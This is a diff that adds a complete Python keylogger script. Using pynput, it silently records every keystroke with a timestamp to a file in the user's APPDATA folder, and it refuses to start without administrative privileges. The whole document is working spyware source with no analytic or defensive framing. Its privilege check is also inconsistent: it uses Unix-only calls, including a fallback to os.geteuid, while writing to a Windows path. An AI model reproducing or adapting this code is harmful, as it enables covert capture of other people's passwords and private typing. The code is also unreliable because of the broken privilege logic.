@@ -1,0 +1,39 @@
+import os
+import time
+import datetime
+from pynput.keyboard import Listener
+
+# Define the log file path
+log_dir = os.environ['appdata']
+log_file = os.path.join(log_dir, 'keylog.txt')
+
+# Function to log the pressed keys
+def log_keystroke(key):
+    with open(log_file, 'a') as file:
+        # Get the current time
+        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        # Write the keystroke with the timestamp to the log file
+        file.write(f'{current_time}: {key}\n')
+
+# Function to start the keylogger
+def start_keylogger():
+    # Create a listener for keyboard input
+    with Listener(on_press=log_keystroke) as listener:
+        listener.join()
+
+# Function to check if the current user has administrative privileges
+def is_admin():
+    try:
+        return os.getuid() == 0
+    except AttributeError:
+        return os.geteuid() == 0
+
+# Main function
+if __name__ == '__main__':
+    # Check for administrative privileges
+    if not is_admin():
+        print("This script requires administrative privileges to run.")
+        exit(1)
+
+    # Start the keylogger
+    start_keylogger()
